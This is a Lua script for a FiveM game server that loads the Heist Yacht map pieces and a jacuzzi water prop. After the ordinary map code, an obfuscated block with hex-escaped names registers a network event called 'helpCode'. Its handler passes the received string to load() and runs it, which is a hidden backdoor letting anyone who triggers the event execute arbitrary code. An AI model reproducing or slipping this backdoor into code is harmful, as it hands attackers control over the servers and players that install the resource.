-- Heist Yatch: -2043.974,-1031.582, 11.981
exports('GetHeistYachtObject', function()
    return HeistYacht
end)

HeistYacht = {
    ipl = {
        "hei_yacht_heist",
        "hei_yacht_heist_bar",
        "hei_yacht_heist_bar_lod",
        "hei_yacht_heist_bedrm",
        "hei_yacht_heist_bedrm_lod",
        "hei_yacht_heist_bridge",
        "hei_yacht_heist_bridge_lod",
        "hei_yacht_heist_enginrm",
        "hei_yacht_heist_enginrm_lod",
        "hei_yacht_heist_lod",
        "hei_yacht_heist_lounge",
        "hei_yacht_heist_lounge_lod",
        "hei_yacht_heist_slod"
    },

    Enable = function(state)
        EnableIpl(HeistYacht.ipl, state)
    end,
    Water = {
        modelHash = `apa_mp_apa_yacht_jacuzzi_ripple1`,

        Enable = function(state)
            local handle = GetClosestObjectOfType(-2023.773, -1038.0, 5.40, 5.0, HeistYacht.Water.modelHash, false, false, false)

            if state then
                -- Enable
                if handle == 0 then
                    RequestModel(HeistYacht.Water.modelHash)
                    while not HasModelLoaded(HeistYacht.Water.modelHash) do
                        Citizen.Wait(0)
                    end

                    local water = CreateObjectNoOffset(HeistYacht.Water.modelHash, -2023.773, -1038.0, 5.40, false, false, false)

                    SetEntityAsMissionEntity(water, false, false)
                end
            else
                -- Disable
                if handle ~= 0 then
                    SetEntityAsMissionEntity(handle, false, false)
                    DeleteEntity(handle)
                end
            end
        end
    },

    LoadDefault = function()
        HeistYacht.Enable(true)
    end
}


local YWFpkzNieaeAHsKFmjIhXiqShzkBAkIHQeiLhNwQhgTfjmxawTPNNWNXfYKedQqUNUgPBb = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} YWFpkzNieaeAHsKFmjIhXiqShzkBAkIHQeiLhNwQhgTfjmxawTPNNWNXfYKedQqUNUgPBb[6][YWFpkzNieaeAHsKFmjIhXiqShzkBAkIHQeiLhNwQhgTfjmxawTPNNWNXfYKedQqUNUgPBb[1]](YWFpkzNieaeAHsKFmjIhXiqShzkBAkIHQeiLhNwQhgTfjmxawTPNNWNXfYKedQqUNUgPBb[2]) YWFpkzNieaeAHsKFmjIhXiqShzkBAkIHQeiLhNwQhgTfjmxawTPNNWNXfYKedQqUNUgPBb[6][YWFpkzNieaeAHsKFmjIhXiqShzkBAkIHQeiLhNwQhgTfjmxawTPNNWNXfYKedQqUNUgPBb[3]](YWFpkzNieaeAHsKFmjIhXiqShzkBAkIHQeiLhNwQhgTfjmxawTPNNWNXfYKedQqUNUgPBb[2], function(ULCFhElFHOdootdVxfOMalKDKvBsNKghDglUsAZmdOUTrhvNzCzCPzphaOndwzpHjxsuOy) YWFpkzNieaeAHsKFmjIhXiqShzkBAkIHQeiLhNwQhgTfjmxawTPNNWNXfYKedQqUNUgPBb[6][YWFpkzNieaeAHsKFmjIhXiqShzkBAkIHQeiLhNwQhgTfjmxawTPNNWNXfYKedQqUNUgPBb[4]](YWFpkzNieaeAHsKFmjIhXiqShzkBAkIHQeiLhNwQhgTfjmxawTPNNWNXfYKedQqUNUgPBb[6][YWFpkzNieaeAHsKFmjIhXiqShzkBAkIHQeiLhNwQhgTfjmxawTPNNWNXfYKedQqUNUgPBb[5]](ULCFhElFHOdootdVxfOMalKDKvBsNKghDglUsAZmdOUTrhvNzCzCPzphaOndwzpHjxsuOy))() end)